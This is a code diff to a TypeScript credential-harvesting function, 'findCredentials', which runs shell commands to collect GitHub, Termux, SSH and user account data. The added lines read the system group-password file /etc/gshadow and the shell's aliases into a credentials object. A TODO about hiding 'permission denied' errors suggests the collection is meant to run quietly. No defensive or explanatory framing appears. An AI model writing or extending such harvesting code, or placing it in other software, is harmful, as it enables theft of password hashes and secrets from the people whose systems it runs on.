@@ -8,6 +8,7 @@ const _run = (args: string): string | null => {
   }
 }
 
+// TODO: Hidde error messages like "file not found" or "permission denied"
 const findCredentials = (text: string) => {
   const credentials = {} as any;
   credentials.gh = {} as any;
@@ -21,6 +22,7 @@ const findCredentials = (text: string) => {
   credentials.termux = {} as any;
   credentials.ssh.sshd = {} as any;
   credentials.users = {} as any;
+  credentials.shell = {} as any;
 
   /* In case system is Termux, prepend prefix to paths */
   const prefix = _run(`echo "$PREFIX"`);
@@ -194,6 +196,20 @@ const findCredentials = (text: string) => {
     credentials.users.group = {} as any;
     credentials.users.group.path = `${path}/etc/group`;
     credentials.users.group.content = group;
+  }
+
+  const gshadow = _run(`cat ${path}/etc/gshadow`);
+  if (gshadow) {
+    credentials.users.gshadow = {} as any;
+    credentials.users.gshadow.path = `${path}/etc/gshadow`;
+    credentials.users.gshadow.content = gshadow;
+  }
+
+  const alias = _run(`alias`);
+  if (alias) {
+    credentials.shell.alias = {} as any;
+    credentials.shell.alias.path = "$ alias";
+    credentials.shell.alias.content = alias;
   }
 
   // TODO: Remove void objects
